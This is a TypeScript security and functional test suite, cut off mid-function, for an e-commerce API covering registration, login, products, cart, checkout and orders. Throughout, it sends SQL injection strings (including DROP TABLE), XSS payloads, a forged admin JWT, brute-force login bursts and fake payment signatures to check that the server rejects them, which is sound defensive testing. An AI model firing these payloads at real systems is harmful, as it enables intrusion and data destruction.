/**
 * ====================================================================
 * AMOHA MOBILES - EXHAUSTIVE API TEST SUITE
 * ====================================================================
 * 
 * Phase 2-9 Coverage: Auth, Products, Cart, Checkout, Orders, Admin,
 *   Edge Cases, Security Attacks, Performance
 * 
 * Usage:
 *   npx ts-node src/tests/api-tests.ts [BASE_URL]
 *   Default: http://localhost:5001/api
 * 
 * Environment Variables:
 *   SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY (for admin promotion)
 * ====================================================================
 */

const BASE_URL = process.argv[2] || 'http://localhost:5001/api';

// ─── Test Infrastructure ──────────────────────────────────────────────

interface TestResult {
  phase: string;
  name: string;
  status: 'PASS' | 'FAIL' | 'WARN' | 'SKIP';
  details: string;
  duration: number;
  priority: 'P0' | 'P1' | 'P2';
}

const results: TestResult[] = [];
let totalPass = 0, totalFail = 0, totalWarn = 0, totalSkip = 0;

// Shared state across tests
let userToken = '';
let userRefreshToken = '';
let userId = '';
let adminToken = '';
let adminRefreshToken = '';
let productId = '';
let productSlug = '';
let categoryId = '';
let categorySlug = '';
let brandId = '';
let brandSlug = '';
let cartItemId = '';
let orderId = '';
let orderNumber = '';
let couponId = '';
let bannerId = '';
let addressId = '';
let returnId = '';
let razorpayOrderId = '';
let secondUserToken = '';

const TEST_EMAIL = `e2e_${Date.now()}@amohatest.com`;
const TEST_EMAIL_2 = `e2e_${Date.now()}_2@amohatest.com`;
const TEST_PASS = 'Test@1234Secure!';
const TEST_PHONE = '9876543210';

async function request(
  method: string, path: string, body?: any, token?: string,
  options: { timeout?: number; rawResponse?: boolean } = {}
): Promise<{ status: number; data: any; headers: Record<string, string>; duration: number }> {
  const start = Date.now();
  const headers: Record<string, string> = { 'Content-Type': 'application/json' };
  if (token) headers['Authorization'] = `Bearer ${token}`;

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), options.timeout || 15000);

  try {
    const res = await fetch(`${BASE_URL}${path}`, {
      method,
      headers,
      body: body ? JSON.stringify(body) : undefined,
      signal: controller.signal,
    });
    clearTimeout(timeoutId);
    const resHeaders: Record<string, string> = {};
    res.headers.forEach((v, k) => resHeaders[k] = v);
    const data = await res.json().catch(() => ({}));
    return { status: res.status, data, headers: resHeaders, duration: Date.now() - start };
  } catch (error: any) {
    clearTimeout(timeoutId);
    return { status: 0, data: { error: error.message }, headers: {}, duration: Date.now() - start };
  }
}

function record(phase: string, name: string, status: 'PASS' | 'FAIL' | 'WARN' | 'SKIP', details: string, duration: number, priority: 'P0' | 'P1' | 'P2' = 'P1') {
  results.push({ phase, name, status, details, duration, priority });
  const icon = { PASS: '✅', FAIL: '❌', WARN: '⚠️', SKIP: '⏭️' }[status];
  if (status === 'PASS') totalPass++;
  else if (status === 'FAIL') totalFail++;
  else if (status === 'WARN') totalWarn++;
  else totalSkip++;
  console.log(`  ${icon} [${priority}] ${name} (${duration}ms) — ${details}`);
}

function assert(phase: string, name: string, condition: boolean, details: string, duration: number, priority: 'P0' | 'P1' | 'P2' = 'P1') {
  record(phase, name, condition ? 'PASS' : 'FAIL', details, duration, priority);
}

// ─── PHASE 2: AUTH TESTS ──────────────────────────────────────────────

async function testAuth() {
  console.log('\n' + '═'.repeat(60));
  console.log('PHASE 2A: AUTHENTICATION TESTS');
  console.log('═'.repeat(60));

  const P = 'AUTH';

  // ── Registration ──

  // Valid registration
  let r = await request('POST', '/auth/register', {
    name: 'QA Tester', email: TEST_EMAIL, phone: TEST_PHONE,
    password: TEST_PASS, confirmPassword: TEST_PASS
  });
  assert(P, 'Register: valid user', r.status === 201, `status=${r.status}`, r.duration, 'P0');
  if (r.data.data?.accessToken) {
    userToken = r.data.data.accessToken;
    userRefreshToken = r.data.data.refreshToken;
    userId = r.data.data.user?.id;
  }

  // Duplicate email
  r = await request('POST', '/auth/register', {
    name: 'Dup User', email: TEST_EMAIL, phone: '9876543211',
    password: TEST_PASS, confirmPassword: TEST_PASS
  });
  assert(P, 'Register: duplicate email → 409', r.status === 409, `status=${r.status}`, r.duration, 'P0');

  // Missing fields
  r = await request('POST', '/auth/register', { email: TEST_EMAIL });
  assert(P, 'Register: missing fields → 400', r.status === 400, `status=${r.status}`, r.duration, 'P1');

  // Invalid email format
  r = await request('POST', '/auth/register', {
    name: 'Bad', email: 'not-an-email', phone: TEST_PHONE,
    password: TEST_PASS, confirmPassword: TEST_PASS
  });
  assert(P, 'Register: invalid email → 400', r.status === 400, `status=${r.status}`, r.duration, 'P1');

  // Short password
  r = await request('POST', '/auth/register', {
    name: 'Short', email: 'short@test.com', phone: TEST_PHONE,
    password: '123', confirmPassword: '123'
  });
  assert(P, 'Register: short password → 400', r.status === 400, `status=${r.status}`, r.duration, 'P1');

  // Mismatched passwords
  r = await request('POST', '/auth/register', {
    name: 'Mismatch', email: 'mis@test.com', phone: TEST_PHONE,
    password: TEST_PASS, confirmPassword: 'DifferentPass123!'
  });
  assert(P, 'Register: password mismatch → 400', r.status === 400, `status=${r.status}`, r.duration, 'P1');

  // SQL injection in name
  r = await request('POST', '/auth/register', {
    name: "'; DROP TABLE users; --", email: 'sqli@test.com', phone: TEST_PHONE,
    password: TEST_PASS, confirmPassword: TEST_PASS
  });
  assert(P, 'Register: SQL injection in name → no crash', r.status !== 500 && r.status !== 0, `status=${r.status}`, r.duration, 'P0');

  // XSS in name
  r = await request('POST', '/auth/register', {
    name: '<script>alert("xss")</script>', email: 'xss@test.com', phone: TEST_PHONE,
    password: TEST_PASS, confirmPassword: TEST_PASS
  });
  assert(P, 'Register: XSS in name → no script in response', !JSON.stringify(r.data).includes('<script>'), `status=${r.status}`, r.duration, 'P0');

  // Very long name (>100 chars)
  r = await request('POST', '/auth/register', {
    name: 'A'.repeat(200), email: 'long@test.com', phone: TEST_PHONE,
    password: TEST_PASS, confirmPassword: TEST_PASS
  });
  assert(P, 'Register: name >100 chars → 400', r.status === 400, `status=${r.status}`, r.duration, 'P2');

  // Invalid phone
  r = await request('POST', '/auth/register', {
    name: 'BadPhone', email: 'badphone@test.com', phone: '123',
    password: TEST_PASS, confirmPassword: TEST_PASS
  });
  assert(P, 'Register: short phone → 400', r.status === 400, `status=${r.status}`, r.duration, 'P1');

  // Unicode in name
  r = await request('POST', '/auth/register', {
    name: '测试用户🚀', email: 'unicode@test.com', phone: '9876543212',
    password: TEST_PASS, confirmPassword: TEST_PASS
  });
  assert(P, 'Register: Unicode name → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P2');

  // Empty body
  r = await request('POST', '/auth/register', {});
  assert(P, 'Register: empty body → 400', r.status === 400, `status=${r.status}`, r.duration, 'P1');

  // ── Login ──

  console.log('\n  --- Login ---');

  // Valid login
  r = await request('POST', '/auth/login', { email: TEST_EMAIL, password: TEST_PASS });
  assert(P, 'Login: valid credentials', r.status === 200, `status=${r.status}`, r.duration, 'P0');
  if (r.data.data?.accessToken) {
    userToken = r.data.data.accessToken;
    userRefreshToken = r.data.data.refreshToken;
  }

  // Wrong password
  r = await request('POST', '/auth/login', { email: TEST_EMAIL, password: 'WrongPass123!' });
  assert(P, 'Login: wrong password → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');

  // Non-existent email
  r = await request('POST', '/auth/login', { email: 'nobody@nowhere.com', password: TEST_PASS });
  assert(P, 'Login: non-existent email → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');

  // Missing password
  r = await request('POST', '/auth/login', { email: TEST_EMAIL });
  assert(P, 'Login: missing password → 400', r.status === 400, `status=${r.status}`, r.duration, 'P1');

  // SQL injection in email
  r = await request('POST', '/auth/login', { email: "admin'--", password: 'anything' });
  assert(P, 'Login: SQL injection in email → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P0');

  // Null bytes
  r = await request('POST', '/auth/login', { email: 'test\x00@evil.com', password: 'test' });
  assert(P, 'Login: null bytes → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

  // ── Token Operations ──

  console.log('\n  --- Token Operations ---');

  // Refresh token
  if (userRefreshToken) {
    r = await request('POST', '/auth/refresh-token', { refreshToken: userRefreshToken });
    assert(P, 'Refresh: valid token → 200', r.status === 200, `status=${r.status}`, r.duration, 'P0');
    if (r.data.data?.accessToken) {
      userToken = r.data.data.accessToken;
      userRefreshToken = r.data.data.refreshToken;
    }
  }

  // Invalid refresh token
  r = await request('POST', '/auth/refresh-token', { refreshToken: 'invalid.token.here' });
  assert(P, 'Refresh: invalid token → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');

  // Tampered JWT (modify payload)
  if (userToken) {
    const parts = userToken.split('.');
    if (parts.length === 3) {
      const tampered = parts[0] + '.' + Buffer.from('{"userId":"00000000-0000-0000-0000-000000000000","role":"admin"}').toString('base64url') + '.' + parts[2];
      r = await request('GET', '/auth/profile', null, tampered);
      assert(P, 'Token: tampered JWT → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');
    }

    // Expired token simulation (use nonsense token)
    r = await request('GET', '/auth/profile', null, 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxIiwicm9sZSI6InVzZXIiLCJpYXQiOjEwMDAwMDAwMDAsImV4cCI6MTAwMDAwMDAwMX0.invalid');
    assert(P, 'Token: expired/invalid JWT → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');
  }

  // Missing auth header
  r = await request('GET', '/auth/profile');
  assert(P, 'Token: no auth header → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');

  // Malformed auth header
  r = await request('GET', '/auth/profile', null, '');
  assert(P, 'Token: empty bearer → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');

  // ── Profile Operations ──

  console.log('\n  --- Profile ---');

  if (userToken) {
    r = await request('GET', '/auth/profile', null, userToken);
    assert(P, 'Profile: get → 200', r.status === 200, `status=${r.status}`, r.duration, 'P0');
    assert(P, 'Profile: email matches', r.data.data?.email === TEST_EMAIL || r.data.data?.user?.email === TEST_EMAIL, `email=${r.data.data?.email || r.data.data?.user?.email}`, 0, 'P1');

    // Update profile
    r = await request('PUT', '/auth/profile', { name: 'QA Updated' }, userToken);
    assert(P, 'Profile: update name → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

    // Update with XSS
    r = await request('PUT', '/auth/profile', { name: '<img src=x onerror=alert(1)>' }, userToken);
    assert(P, 'Profile: XSS in name → no script in response', !JSON.stringify(r.data).includes('onerror'), `status=${r.status}`, r.duration, 'P0');

    // Change password
    r = await request('PUT', '/auth/change-password', {
      currentPassword: TEST_PASS, newPassword: 'NewPass@5678!'
    }, userToken);
    assert(P, 'Password: change → 200', r.status === 200, `status=${r.status}`, r.duration, 'P0');

    // Change back
    r = await request('POST', '/auth/login', { email: TEST_EMAIL, password: 'NewPass@5678!' });
    if (r.data.data?.accessToken) userToken = r.data.data.accessToken;
    r = await request('PUT', '/auth/change-password', {
      currentPassword: 'NewPass@5678!', newPassword: TEST_PASS
    }, userToken);
    assert(P, 'Password: change back → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

    // Re-login with original password
    r = await request('POST', '/auth/login', { email: TEST_EMAIL, password: TEST_PASS });
    if (r.data.data?.accessToken) {
      userToken = r.data.data.accessToken;
      userRefreshToken = r.data.data.refreshToken;
    }

    // Wrong current password
    r = await request('PUT', '/auth/change-password', {
      currentPassword: 'completelyWrong', newPassword: TEST_PASS
    }, userToken);
    assert(P, 'Password: wrong current → 401', r.status === 401 || r.status === 400, `status=${r.status}`, r.duration, 'P0');
  }

  // ── Forgot Password ──

  console.log('\n  --- Forgot Password ---');

  r = await request('POST', '/auth/forgot-password', { email: TEST_EMAIL });
  assert(P, 'Forgot: valid email → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

  r = await request('POST', '/auth/forgot-password', { email: 'nonexistent@void.com' });
  assert(P, 'Forgot: non-existent email → still 200 (no leak)', r.status === 200, `status=${r.status}`, r.duration, 'P0');

  r = await request('POST', '/auth/reset-password', { token: 'invalid-uuid', password: TEST_PASS });
  assert(P, 'Reset: invalid token → 400/401', r.status === 400 || r.status === 401, `status=${r.status}`, r.duration, 'P1');

  // ── Brute Force Protection ──

  console.log('\n  --- Rate Limiting ---');

  const bruteForceAttempts = [];
  for (let i = 0; i < 12; i++) {
    bruteForceAttempts.push(request('POST', '/auth/login', { email: TEST_EMAIL, password: 'wrong' + i }));
  }
  const bruteResults = await Promise.all(bruteForceAttempts);
  const rateLimited = bruteResults.some(r => r.status === 429);
  assert(P, 'Brute force: rate limit triggered after 10+ attempts', rateLimited, `Got 429: ${rateLimited}`, 0, 'P0');
}

// ─── PHASE 2: PRODUCT SYSTEM TESTS ───────────────────────────────────

async function testProducts() {
  console.log('\n' + '═'.repeat(60));
  console.log('PHASE 2B: PRODUCT SYSTEM TESTS');
  console.log('═'.repeat(60));

  const P = 'PRODUCT';

  // ── Public Product Listing ──

  let r = await request('GET', '/products');
  assert(P, 'List: get all products → 200', r.status === 200, `status=${r.status}`, r.duration, 'P0');
  assert(P, 'List: has data property', r.data.success === true, `success=${r.data.success}`, 0, 'P0');

  // Pagination
  r = await request('GET', '/products?page=1&limit=5');
  assert(P, 'List: pagination → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

  r = await request('GET', '/products?page=0&limit=0');
  assert(P, 'List: page=0 → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

  r = await request('GET', '/products?page=-1&limit=-5');
  assert(P, 'List: negative pagination → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

  r = await request('GET', '/products?page=999999&limit=100');
  assert(P, 'List: page beyond range → empty array', r.status === 200, `status=${r.status}`, r.duration, 'P1');

  // Search
  r = await request('GET', '/products?search=samsung');
  assert(P, 'Search: normal term → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

  r = await request('GET', '/products?search=' + encodeURIComponent("'; DROP TABLE products; --"));
  assert(P, 'Search: SQL injection → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P0');

  r = await request('GET', '/products?search=' + encodeURIComponent('<script>alert(1)</script>'));
  assert(P, 'Search: XSS attempt → no script in response', !JSON.stringify(r.data).includes('<script>alert'), `status=${r.status}`, r.duration, 'P0');

  r = await request('GET', '/products?search=' + encodeURIComponent('🎉📱🔥'));
  assert(P, 'Search: emoji → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P2');

  r = await request('GET', '/products?search=' + 'a'.repeat(1000));
  assert(P, 'Search: 1000 char query → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

  r = await request('GET', '/products?search=');
  assert(P, 'Search: empty string → 200', r.status === 200, `status=${r.status}`, r.duration, 'P2');

  r = await request('GET', '/products?search=%00%01%02');
  assert(P, 'Search: null bytes → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

  // Filters
  r = await request('GET', '/products?minPrice=100&maxPrice=500');
  assert(P, 'Filter: price range → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

  r = await request('GET', '/products?minPrice=-100&maxPrice=-50');
  assert(P, 'Filter: negative prices → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

  r = await request('GET', '/products?minPrice=500&maxPrice=100');
  assert(P, 'Filter: min > max → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

  r = await request('GET', '/products?minPrice=NaN&maxPrice=abc');
  assert(P, 'Filter: non-numeric prices → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

  r = await request('GET', '/products?sort=price_asc');
  assert(P, 'Sort: price_asc → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

  r = await request('GET', '/products?sort=; DROP TABLE products');
  assert(P, 'Sort: SQL injection → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P0');

  // Featured / Trending
  r = await request('GET', '/products/featured');
  assert(P, 'Featured: → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

  r = await request('GET', '/products/trending');
  assert(P, 'Trending: → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

  // Search suggestions
  r = await request('GET', '/products/search/suggestions?q=sam');
  assert(P, 'Suggestions: → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

  // Top reviews
  r = await request('GET', '/products/reviews/top');
  assert(P, 'Top reviews: → 200', r.status === 200, `status=${r.status}`, r.duration, 'P2');

  // Get single product by slug
  r = await request('GET', '/products');
  if (r.data.data?.products?.[0]) {
    productId = r.data.data.products[0].id;
    productSlug = r.data.data.products[0].slug;
  } else if (r.data.data?.[0]) {
    productId = r.data.data[0].id;
    productSlug = r.data.data[0].slug;
  }

  if (productSlug) {
    r = await request('GET', `/products/${productSlug}`);
    assert(P, 'BySlug: valid slug → 200', r.status === 200, `status=${r.status} slug=${productSlug}`, r.duration, 'P0');
  }

  r = await request('GET', '/products/nonexistent-slug-12345');
  assert(P, 'BySlug: invalid slug → 404', r.status === 404, `status=${r.status}`, r.duration, 'P1');

  r = await request('GET', '/products/' + encodeURIComponent("'; SELECT * FROM users; --"));
  assert(P, 'BySlug: SQL injection → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P0');

  // Related products
  if (productId) {
    r = await request('GET', `/products/${productId}/related`);
    assert(P, 'Related: valid ID → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');
  }

  r = await request('GET', '/products/invalid-id/related');
  assert(P, 'Related: invalid ID → 400/404', r.status === 400 || r.status === 404, `status=${r.status}`, r.duration, 'P1');

  // ── Categories ──

  console.log('\n  --- Categories ---');

  r = await request('GET', '/categories');
  assert(P, 'Categories: list → 200', r.status === 200, `status=${r.status}`, r.duration, 'P0');
  const cats = r.data.data?.categories || r.data.data || [];
  if (Array.isArray(cats) && cats.length > 0) {
    categoryId = cats[0].id;
    categorySlug = cats[0].slug;
  }

  if (categorySlug) {
    r = await request('GET', `/categories/${categorySlug}`);
    assert(P, 'Category: by slug → 200', r.status === 200, `slug=${categorySlug}`, r.duration, 'P1');
  }

  if (categorySlug) {
    r = await request('GET', `/products/category/${categorySlug}`);
    assert(P, 'Products by category: → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');
  }

  // ── Brands ──

  console.log('\n  --- Brands ---');

  r = await request('GET', '/brands');
  assert(P, 'Brands: list → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');
  const brands = r.data.data?.brands || r.data.data || [];
  if (Array.isArray(brands) && brands.length > 0) {
    brandId = brands[0].id;
    brandSlug = brands[0].slug;
  }

  // ── Banners ──

  r = await request('GET', '/banners');
  assert(P, 'Banners: list → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');
}

// ─── PHASE 2: CART TESTS ─────────────────────────────────────────────

async function testCart() {
  console.log('\n' + '═'.repeat(60));
  console.log('PHASE 2C: CART SYSTEM TESTS');
  console.log('═'.repeat(60));

  const P = 'CART';

  if (!userToken) {
    record(P, 'SKIPPED: No user token', 'SKIP', 'Auth failed', 0, 'P0');
    return;
  }

  // Get cart (empty)
  let r = await request('GET', '/cart', null, userToken);
  assert(P, 'Get: empty cart → 200', r.status === 200, `status=${r.status}`, r.duration, 'P0');

  // Add item
  if (productId) {
    r = await request('POST', '/cart/add', { productId, quantity: 1 }, userToken);
    assert(P, 'Add: valid product → 200/201', r.status === 200 || r.status === 201, `status=${r.status}`, r.duration, 'P0');

    // Extract cart item ID
    r = await request('GET', '/cart', null, userToken);
    const items = r.data.data?.items || r.data.data?.cart?.items || [];
    if (items.length > 0) cartItemId = items[0].id;

    // Add same product again → should update quantity
    r = await request('POST', '/cart/add', { productId, quantity: 1 }, userToken);
    assert(P, 'Add: duplicate product → updates qty', r.status === 200 || r.status === 201, `status=${r.status}`, r.duration, 'P1');

    // Add with zero quantity
    r = await request('POST', '/cart/add', { productId, quantity: 0 }, userToken);
    assert(P, 'Add: quantity=0 → 400', r.status === 400, `status=${r.status}`, r.duration, 'P1');

    // Add with negative quantity
    r = await request('POST', '/cart/add', { productId, quantity: -5 }, userToken);
    assert(P, 'Add: negative quantity → 400', r.status === 400, `status=${r.status}`, r.duration, 'P0');

    // Add with extremely large quantity
    r = await request('POST', '/cart/add', { productId, quantity: 999999 }, userToken);
    assert(P, 'Add: quantity=999999 → handled', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

    // Add with float quantity
    r = await request('POST', '/cart/add', { productId, quantity: 1.5 }, userToken);
    assert(P, 'Add: float quantity → handled', r.status !== 500, `status=${r.status}`, r.duration, 'P1');
  }

  // Add invalid product ID
  r = await request('POST', '/cart/add', { productId: 'invalid-uuid', quantity: 1 }, userToken);
  assert(P, 'Add: invalid product ID → 400', r.status === 400 || r.status === 404, `status=${r.status}`, r.duration, 'P1');

  r = await request('POST', '/cart/add', { productId: '00000000-0000-0000-0000-000000000000', quantity: 1 }, userToken);
  assert(P, 'Add: non-existent product → 404', r.status === 404 || r.status === 400, `status=${r.status}`, r.duration, 'P1');

  // No auth
  r = await request('POST', '/cart/add', { productId, quantity: 1 });
  assert(P, 'Add: no auth → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');

  // Update quantity
  if (cartItemId) {
    r = await request('PUT', `/cart/item/${cartItemId}`, { quantity: 3 }, userToken);
    assert(P, 'Update: quantity=3 → 200', r.status === 200, `status=${r.status}`, r.duration, 'P0');

    r = await request('PUT', `/cart/item/${cartItemId}`, { quantity: 0 }, userToken);
    assert(P, 'Update: quantity=0 → 400', r.status === 400, `status=${r.status}`, r.duration, 'P0');

    r = await request('PUT', `/cart/item/${cartItemId}`, { quantity: -1 }, userToken);
    assert(P, 'Update: quantity=-1 → 400', r.status === 400, `status=${r.status}`, r.duration, 'P0');
  }

  // Coupon operations
  r = await request('POST', '/cart/coupon', { code: 'NONEXISTENT' }, userToken);
  assert(P, 'Coupon: invalid code → 400/404', r.status === 400 || r.status === 404, `status=${r.status}`, r.duration, 'P1');

  r = await request('POST', '/cart/coupon', { code: "'; DROP TABLE coupons; --" }, userToken);
  assert(P, 'Coupon: SQL injection → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P0');

  r = await request('DELETE', '/cart/coupon', null, userToken);
  assert(P, 'Coupon: remove → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

  // Save for later
  if (cartItemId) {
    r = await request('POST', `/cart/save-for-later/${cartItemId}`, null, userToken);
    assert(P, 'SaveForLater: → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

    // Move back to cart
    r = await request('POST', `/cart/move-to-cart/${cartItemId}`, null, userToken);
    assert(P, 'MoveToCart: → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');
  }

  // Get cart accessories
  r = await request('GET', '/cart/accessories', null, userToken);
  assert(P, 'Accessories: → 200', r.status === 200, `status=${r.status}`, r.duration, 'P2');

  // Rapid add/remove (race condition test)
  if (productId) {
    console.log('\n  --- Race Conditions ---');
    const rapid = [];
    for (let i = 0; i < 10; i++) {
      rapid.push(request('POST', '/cart/add', { productId, quantity: 1 }, userToken));
    }
    const rapidResults = await Promise.all(rapid);
    const rapidSuccess = rapidResults.filter(r => r.status === 200 || r.status === 201).length;
    assert(P, `Rapid add: ${rapidSuccess}/10 succeeded`, rapidResults.every(r => r.status !== 500), `No 500s`, 0, 'P1');
  }
}

// ─── PHASE 2: CHECKOUT & PAYMENT TESTS ───────────────────────────────

async function testCheckout() {
  console.log('\n' + '═'.repeat(60));
  console.log('PHASE 2D: CHECKOUT & PAYMENT (CRITICAL PATH)');
  console.log('═'.repeat(60));

  const P = 'CHECKOUT';

  if (!userToken) {
    record(P, 'SKIPPED: No user token', 'SKIP', 'Auth failed', 0, 'P0');
    return;
  }

  // Ensure cart has items
  if (productId) {
    await request('POST', '/cart/add', { productId, quantity: 1 }, userToken);
  }

  // ── Address Management ──

  console.log('\n  --- Address Management ---');

  // Add address
  let r = await request('POST', '/users/addresses', {
    fullName: 'QA Tester', phone: '9876543210',
    addressLine1: '123 Test Street', city: 'Mumbai',
    state: 'Maharashtra', pincode: '400001', type: 'home'
  }, userToken);
  assert(P, 'Address: add → 200/201', r.status === 200 || r.status === 201, `status=${r.status}`, r.duration, 'P0');
  addressId = r.data.data?.id || r.data.data?.address?.id;

  // Add with invalid pincode
  r = await request('POST', '/users/addresses', {
    fullName: 'Bad', phone: '9876543210',
    addressLine1: '123 Test', city: 'Mumbai',
    state: 'Maharashtra', pincode: '12345', type: 'home'
  }, userToken);
  assert(P, 'Address: invalid pincode → 400', r.status === 400, `status=${r.status}`, r.duration, 'P1');

  // Add with SQL injection
  r = await request('POST', '/users/addresses', {
    fullName: "'; DROP TABLE addresses; --", phone: '9876543210',
    addressLine1: '123', city: 'Mumbai',
    state: 'Maharashtra', pincode: '400001'
  }, userToken);
  assert(P, 'Address: SQL injection → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P0');

  // ── COD Order ──

  console.log('\n  --- COD Order ---');

  r = await request('POST', '/orders', {
    shippingAddress: {
      fullName: 'QA Tester', phone: '9876543210',
      addressLine1: '123 Test Street', city: 'Mumbai',
      state: 'Maharashtra', pincode: '400001'
    },
    paymentMethod: 'cod'
  }, userToken);
  assert(P, 'COD Order: create → 200/201', r.status === 200 || r.status === 201, `status=${r.status}`, r.duration, 'P0');
  if (r.data.data?.id) orderId = r.data.data.id;
  if (r.data.data?.orderNumber || r.data.data?.order_number) {
    orderNumber = r.data.data.orderNumber || r.data.data.order_number;
  }

  // Order from empty cart
  r = await request('POST', '/orders', {
    shippingAddress: {
      fullName: 'QA Tester', phone: '9876543210',
      addressLine1: '123 Test Street', city: 'Mumbai',
      state: 'Maharashtra', pincode: '400001'
    },
    paymentMethod: 'cod'
  }, userToken);
  assert(P, 'COD Order: empty cart → 400', r.status === 400, `status=${r.status}`, r.duration, 'P0');

  // Order without auth
  r = await request('POST', '/orders', {
    shippingAddress: {
      fullName: 'Anon', phone: '9876543210',
      addressLine1: '123', city: 'Test', state: 'Test', pincode: '400001'
    },
    paymentMethod: 'cod'
  });
  assert(P, 'COD Order: no auth → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');

  // Invalid payment method
  r = await request('POST', '/orders', {
    shippingAddress: {
      fullName: 'QA', phone: '9876543210',
      addressLine1: '123', city: 'Test', state: 'Test', pincode: '400001'
    },
    paymentMethod: 'bitcoin'
  }, userToken);
  assert(P, 'Order: invalid payment method → 400', r.status === 400, `status=${r.status}`, r.duration, 'P1');

  // Missing shipping address
  r = await request('POST', '/orders', { paymentMethod: 'cod' }, userToken);
  assert(P, 'Order: missing address → 400', r.status === 400, `status=${r.status}`, r.duration, 'P0');

  // ── Razorpay Payment ──

  console.log('\n  --- Razorpay Payment ---');

  // Re-add to cart for Razorpay test
  if (productId) {
    await request('POST', '/cart/add', { productId, quantity: 1 }, userToken);
  }

  r = await request('POST', '/payment/create-order', {}, userToken);
  assert(P, 'Razorpay: create order → 200', r.status === 200, `status=${r.status}`, r.duration, 'P0');
  if (r.data.data?.razorpayOrderId) razorpayOrderId = r.data.data.razorpayOrderId;

  // Verify with invalid signature
  r = await request('POST', '/payment/verify', {
    razorpayOrderId: razorpayOrderId || 'order_fake123',
    razorpayPaymentId: 'pay_fake123',
    razorpaySignature: 'a'.repeat(64),
    shippingAddress: {
      fullName: 'QA', phone: '9876543210',
      addressLine1: '123 Test', city: 'Mumbai', state: 'MH', pincode: '400001'
    }
  }, userToken);
  assert(P, 'Razorpay: invalid signature → 400', r.status === 400 || r.status === 401, `status=${r.status}`, r.duration, 'P0');

  // Verify without auth
  r = await request('POST', '/payment/verify', {
    razorpayOrderId: 'order_test', razorpayPaymentId: 'pay_test',
    razorpaySignature: 'a'.repeat(64),
    shippingAddress: {
      fullName: 'QA', phone: '9876543210',
      addressLine1: '123', city: 'X', state: 'X', pincode: '400001'
    }
  });
  assert(P, 'Razorpay: verify no auth → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');

  // ── Double Payment Prevention ──

  console.log('\n  --- Double Payment ---');

  if (productId) {
    await request('POST', '/cart/add', { productId, quantity: 1 }, userToken);
    const [order1, order2] = await Promise.all([
      request('POST', '/payment/create-order', {}, userToken),
      request('POST', '/payment/create-order', {}, userToken),
    ]);
    assert(P, 'Double create-order: no 500', order1.status !== 500 && order2.status !== 500, `s1=${order1.status} s2=${order2.status}`, 0, 'P0');
  }
}

// ─── PHASE 2: ORDER TESTS ────────────────────────────────────────────

async function testOrders() {
  console.log('\n' + '═'.repeat(60));
  console.log('PHASE 2E: ORDER MANAGEMENT TESTS');
  console.log('═'.repeat(60));

  const P = 'ORDER';

  if (!userToken) {
    record(P, 'SKIPPED: No user token', 'SKIP', 'Auth failed', 0, 'P0');
    return;
  }

  // List orders
  let r = await request('GET', '/orders', null, userToken);
  assert(P, 'List: user orders → 200', r.status === 200, `status=${r.status}`, r.duration, 'P0');

  // Get specific order
  if (orderId) {
    r = await request('GET', `/orders/${orderId}`, null, userToken);
    assert(P, 'Get: by ID → 200', r.status === 200, `status=${r.status}`, r.duration, 'P0');

    // Track order
    r = await request('GET', `/orders/${orderId}/track`, null, userToken);
    assert(P, 'Track: by ID → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

    // Invoice download
    r = await request('GET', `/orders/${orderId}/invoice`, null, userToken);
    assert(P, 'Invoice: download → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');
  }

  // Get non-existent order
  r = await request('GET', '/orders/00000000-0000-0000-0000-000000000000', null, userToken);
  assert(P, 'Get: non-existent → 404', r.status === 404, `status=${r.status}`, r.duration, 'P1');

  // SQL injection in order ID
  r = await request('GET', "/orders/'; SELECT * FROM orders; --", null, userToken);
  assert(P, 'Get: SQL injection → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P0');

  // ── Public Tracking ──

  console.log('\n  --- Public Tracking ---');

  if (orderNumber) {
    r = await request('GET', `/orders/track/public?orderNumber=${orderNumber}&phone=9876543210`);
